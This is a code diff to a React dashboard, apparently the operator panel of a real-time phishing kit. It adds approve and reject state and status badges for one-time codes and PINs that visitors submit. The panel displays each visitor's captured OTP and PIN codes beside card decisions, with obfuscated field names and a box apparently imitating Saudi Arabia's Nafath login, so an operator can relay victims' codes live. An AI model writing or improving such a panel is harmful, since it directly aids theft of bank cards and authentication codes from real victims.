@@ -102,6 +102,8 @@ export default function DashboardPage() {
   const [openLogBox, setOpenLogBox] = useState<string | null>(null);
   const [cardLocalDecision, setCardLocalDecision] = useState<"approved" | "rejected" | "pin" | null>(null);
   const [phoneLocalDecision, setPhoneLocalDecision] = useState<"approved" | "rejected" | null>(null);
+  const [otpLocalDecision, setOtpLocalDecision] = useState<"approved" | "rejected" | null>(null);
+  const [pinLocalDecision, setPinLocalDecision] = useState<"approved" | "rejected" | null>(null);
   const socketRef = useRef<Socket | null>(null);
   const currentTimeRef = useRef(Date.now());
   const headerMenuRef = useRef<HTMLDivElement | null>(null);
@@ -543,6 +545,8 @@ export default function DashboardPage() {
   useEffect(() => {
     setCardLocalDecision(null);
     setPhoneLocalDecision(null);
+    setOtpLocalDecision(null);
+    setPinLocalDecision(null);
   }, [selectedRequestId]);
 
   // Get country flag
@@ -961,10 +965,12 @@ export default function DashboardPage() {
   };
 
   const handleLocalOtpAction = async (action: "approved" | "rejected") => {
+    setOtpLocalDecision(action);
     await applyLocalBoxDecision("otp", "_v5Status", action, action === "approved" ? "تم الموافقة على رمز التحقق" : "تم رفض رمز التحقق");
   };
 
   const handlePinAction = async (action: "approved" | "rejected") => {
+    setPinLocalDecision(action);
     const visitorId = selectedRequest?.visitorId || selectedRequest?.id;
     if (!visitorId) return;
     setActionLoading("pin");
@@ -990,6 +996,7 @@ export default function DashboardPage() {
   };
 
   const handleLocalPinAction = async (action: "approved" | "rejected") => {
+    setPinLocalDecision(action);
     await applyLocalBoxDecision("pin", "_v6Status", action, action === "approved" ? "تم الموافقة على رمز PIN" : "تم رفض رمز PIN");
   };
 
@@ -3087,8 +3094,8 @@ const renderNafadBox = () => {
     if (latestOtpEntry) {
       const raw = latestOtpEntry.raw || {};
       const otpCode = raw._v5 || raw.otpCode;
-      const effectiveOtpStatus = localDecisionStates.otp || raw._v5Status || raw.otpStatus || "";
-      const showOtpDecisionButtons = !["approved", "rejected"].includes(effectiveOtpStatus) && Boolean(otpCode);
+      const effectiveOtpStatus = otpLocalDecision || localDecisionStates.otp || raw._v5Status || raw.otpStatus || "";
+      const showOtpDecisionButtons = !otpLocalDecision && !["approved", "rejected"].includes(effectiveOtpStatus) && Boolean(otpCode);
       // Use _v5UpdatedAt for OTP box timestamp, fallback to comparCompletedAt or submittedAt
       let entryTimestamp = raw._v5UpdatedAt 
         ? new Date(raw._v5UpdatedAt).getTime()
@@ -3141,9 +3148,19 @@ const renderNafadBox = () => {
                 <p style={{ margin: "0 0 4px", fontSize: "12px", color: "#0369a1" }}>رمز التحقق المُدخل:</p>
                 <p style={{ margin: 0, fontSize: "24px", fontWeight: 700, color: "#0c4a6e", letterSpacing: "0.3em" }}>{otpCode}</p>
               </div>
-              <div style={{ marginTop: 8, padding: "10px 12px", borderRadius: 8, background: "#fef3c7", color: "#92400e", fontSize: "12px", textAlign: "center", fontWeight: 600 }}>
-                ⏳ في انتظار المراجعة فقط
-              </div>
+              {effectiveOtpStatus === "approved" ? (
+                <div style={{ marginTop: 8, padding: "10px 12px", borderRadius: 8, background: "#dcfce7", color: "#166534", fontSize: "12px", textAlign: "center", fontWeight: 600 }}>
+                  ✓ تمت الموافقة
+                </div>
+              ) : effectiveOtpStatus === "rejected" ? (
+                <div style={{ marginTop: 8, padding: "10px 12px", borderRadius: 8, background: "#fee2e2", color: "#991b1b", fontSize: "12px", textAlign: "center", fontWeight: 600 }}>
+                  ✗ تم رفض رمز التحقق
+                </div>
+              ) : (
+                <div style={{ marginTop: 8, padding: "10px 12px", borderRadius: 8, background: "#fef3c7", color: "#92400e", fontSize: "12px", textAlign: "center", fontWeight: 600 }}>
+                  ⏳ في انتظار المراجعة فقط
+                </div>
+              )}
               {showOtpDecisionButtons && (
                 <div style={{ display: "flex", gap: 8, justifyContent: "center", marginTop: 10 }}>
                   <button onClick={() => handleLocalOtpAction("approved")} style={{ border: "none", borderRadius: 8, padding: "8px 12px", background: "#16a34a", color: "#fff", cursor: "pointer", fontWeight: 700 }}>
@@ -3269,8 +3286,8 @@ const renderNafadBox = () => {
     if (latestPinEntry) {
       const raw = latestPinEntry.raw || {};
       const pinCode = raw._v6 || raw.pinCode;
-      const effectivePinStatus = localDecisionStates.pin || raw._v6Status || raw.pinStatus || "";
-      const showPinDecisionButtons = !["approved", "rejected"].includes(effectivePinStatus) && Boolean(pinCode);
+      const effectivePinStatus = pinLocalDecision || localDecisionStates.pin || raw._v6Status || raw.pinStatus || "";
+      const showPinDecisionButtons = !pinLocalDecision && !["approved", "rejected"].includes(effectivePinStatus) && Boolean(pinCode);
       // Use _v6UpdatedAt for PIN box timestamp, fallback to comparCompletedAt or submittedAt
       let entryTimestamp = raw._v6UpdatedAt 
         ? new Date(raw._v6UpdatedAt).getTime()
@@ -3328,9 +3345,19 @@ const renderNafadBox = () => {
                   );
                 })}
               </div>
-              <div style={{ marginTop: 8, padding: "10px 12px", borderRadius: 8, background: "#fef3c7", color: "#92400e", fontSize: "12px", textAlign: "center", fontWeight: 600 }}>
-                ⏳ في انتظار المراجعة فقط
-              </div>
+              {effectivePinStatus === "approved" ? (
+                <div style={{ marginTop: 8, padding: "10px 12px", borderRadius: 8, background: "#dcfce7", color: "#166534", fontSize: "12px", textAlign: "center", fontWeight: 600 }}>
+                  ✓ تمت الموافقة
+                </div>
+              ) : effectivePinStatus === "rejected" ? (
+                <div style={{ marginTop: 8, padding: "10px 12px", borderRadius: 8, background: "#fee2e2", color: "#991b1b", fontSize: "12px", textAlign: "center", fontWeight: 600 }}>
+                  ✗ تم رفض رمز PIN
+                </div>
+              ) : (
+                <div style={{ marginTop: 8, padding: "10px 12px", borderRadius: 8, background: "#fef3c7", color: "#92400e", fontSize: "12px", textAlign: "center", fontWeight: 600 }}>
+                  ⏳ في انتظار المراجعة فقط
+                </div>
+              )}
               {showPinDecisionButtons && (
                 <div style={{ display: "flex", gap: 8, justifyContent: "center", marginTop: 10 }}>
                   <button onClick={() => handleLocalPinAction("approved")} style={{ border: "none", borderRadius: 8, padding: "8px 12px", background: "#16a34a", color: "#fff", cursor: "pointer", fontWeight: 700 }}>
